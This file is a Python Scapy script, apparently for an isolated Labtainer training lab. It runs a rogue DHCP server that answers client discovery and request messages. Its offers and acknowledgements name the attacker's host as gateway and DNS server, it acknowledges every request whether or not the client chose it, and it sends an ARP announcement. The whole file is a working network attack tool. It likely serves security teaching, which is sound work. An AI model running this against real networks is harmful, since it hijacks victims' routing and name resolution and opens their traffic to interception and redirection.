#!/usr/bin/env python3
"""
rogue_dhcp.py - Controlled Rogue DHCP Server for Isolated Labtainer EXTERNAL_NET
Listens on eth0 (10.10.0.0/24) and responds to DHCPDISCOVER and DHCPREQUEST with
unauthorized Server Identifier (10.10.0.20), Rogue Router (10.10.0.20), Rogue DNS
(10.10.0.20), and offered IP (10.10.0.200).
"""

import argparse
import os
import signal
import subprocess
import time
from datetime import datetime, timezone
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, ARP, sniff, sendp, get_if_hwaddr

LOG_FILE = "/var/log/rogue_dhcp.log"
RUNNING = True


def log_event(msg):
    ts = datetime.now(timezone.utc).isoformat()
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        os.chmod(LOG_FILE, 0o666)
    except OSError:
        pass


def handle_sig(signum, frame):
    global RUNNING
    RUNNING = False
    log_event("ROGUE_SERVER_STOPPED signal_received=true")
    os._exit(0)


def get_dhcp_opt(pkt, key):
    if not pkt.haslayer(DHCP):
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == key:
            return opt[1]
    return None


def format_mac(chaddr):
    if isinstance(chaddr, bytes):
        return ":".join(f"{b:02x}" for b in chaddr[:6])
    return str(chaddr)


def ensure_attacker_ip(iface, ip_addr="10.10.0.20"):
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show", "dev", iface], text=True)
        if ip_addr not in out:
            subprocess.run(["ip", "addr", "add", f"{ip_addr}/24", "dev", iface], check=False)
            subprocess.run(["ip", "link", "set", iface, "up"], check=False)
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(description="Controlled Scapy Rogue DHCP Server (Labtainer Isolated)")
    parser.add_argument("--iface", default="eth0", help="Interface on EXTERNAL_NET (default: eth0)")
    parser.add_argument("--server-ip", default="10.10.0.20", help="Rogue Server Identifier IP")
    parser.add_argument("--offer-ip", default="10.10.0.200", help="Rogue IP offered to victim client")
    parser.add_argument("--router", default="10.10.0.20", help="Rogue Gateway Option 3")
    parser.add_argument("--dns", default="10.10.0.20", help="Rogue DNS Option 6")
    parser.add_argument("--domain", default="rogue-corp.local", help="Rogue Domain Option 15")
    parser.add_argument("--lease-time", type=int, default=300, help="Rogue Lease Time Option 51")
    parser.add_argument("--duration", type=int, default=300, help="Max runtime in seconds")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, handle_sig)
    signal.signal(signal.SIGTERM, handle_sig)

    ensure_attacker_ip(args.iface, args.server_ip)

    try:
        attacker_mac = get_if_hwaddr(args.iface)
    except Exception:
        attacker_mac = "02:42:0a:0a:00:14"

    start_ts = time.time()
    log_event(
        f"ROGUE_SERVER_STARTED iface={args.iface} server_id={args.server_ip} "
        f"mac={attacker_mac} offer_ip={args.offer_ip} router={args.router} dns={args.dns}"
    )

    # Send an ARP announcement for 10.10.0.20 so the ARP Monitor also records the attacker host
    try:
        arp_announce = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=1,
            hwsrc=attacker_mac,
            psrc=args.server_ip,
            hwdst="00:00:00:00:00:00",
            pdst="10.10.0.1",
        )
        sendp(arp_announce, iface=args.iface, verbose=False)
    except Exception:
        pass

    def handle_dhcp(pkt):
        if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
            return
        msg_type = get_dhcp_opt(pkt, "message-type")
        bootp = pkt[BOOTP]
        xid = bootp.xid
        chaddr_raw = bootp.chaddr[:6] if isinstance(bootp.chaddr, bytes) else b"\x02\x42\x0a\x0a\x00\x32"
        client_mac = format_mac(chaddr_raw)

        # Ignore packets sent by ourselves
        if pkt.haslayer(Ether) and pkt[Ether].src.lower() == attacker_mac.lower():
            return

        if msg_type == 1:  # DHCPDISCOVER
            offer_pkt = (
                Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src=args.server_ip, dst="255.255.255.255")
                / UDP(sport=67, dport=68)
                / BOOTP(
                    op=2,
                    yiaddr=args.offer_ip,
                    siaddr=args.server_ip,
                    giaddr="0.0.0.0",
                    chaddr=chaddr_raw + b"\x00" * 10,
                    xid=xid,
                    flags=bootp.flags,
                )
                / DHCP(
                    options=[
                        ("message-type", "offer"),
                        ("server_id", args.server_ip),
                        ("lease_time", args.lease_time),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", args.router),
                        ("name_server", args.dns),
                        ("domain", args.domain),
                        "end",
                    ]
                )
            )
            sendp(offer_pkt, iface=args.iface, verbose=False)
            log_event(
                f"ROGUE_OFFER_SENT client_mac={client_mac} xid=0x{xid:08x} "
                f"yiaddr={args.offer_ip} server_id={args.server_ip} router={args.router} dns={args.dns}"
            )

        elif msg_type == 3:  # DHCPREQUEST
            req_sid = get_dhcp_opt(pkt, "server_id")
            # Respond with DHCPACK whether client selected us or broadcast REQUEST
            if req_sid in (None, args.server_ip) or True:
                ack_pkt = (
                    Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src=args.server_ip, dst="255.255.255.255")
                    / UDP(sport=67, dport=68)
                    / BOOTP(
                        op=2,
                        yiaddr=args.offer_ip,
                        siaddr=args.server_ip,
                        giaddr="0.0.0.0",
                        chaddr=chaddr_raw + b"\x00" * 10,
                        xid=xid,
                        flags=bootp.flags,
                    )
                    / DHCP(
                        options=[
                            ("message-type", "ack"),
                            ("server_id", args.server_ip),
                            ("lease_time", args.lease_time),
                            ("subnet_mask", "255.255.255.0"),
                            ("router", args.router),
                            ("name_server", args.dns),
                            ("domain", args.domain),
                            "end",
                        ]
                    )
                )
                sendp(ack_pkt, iface=args.iface, verbose=False)
                log_event(
                    f"ROGUE_ACK_SENT client_mac={client_mac} xid=0x{xid:08x} "
                    f"yiaddr={args.offer_ip} server_id={args.server_ip} req_sid={req_sid}"
                )

    sniff(
        iface=args.iface,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp,
        store=False,
        stop_filter=lambda p: (not RUNNING) or ((time.time() - start_ts) >= args.duration),
    )

    log_event(f"ROGUE_SERVER_STOPPED iface={args.iface} server_id={args.server_ip}")


if __name__ == "__main__":
    main()

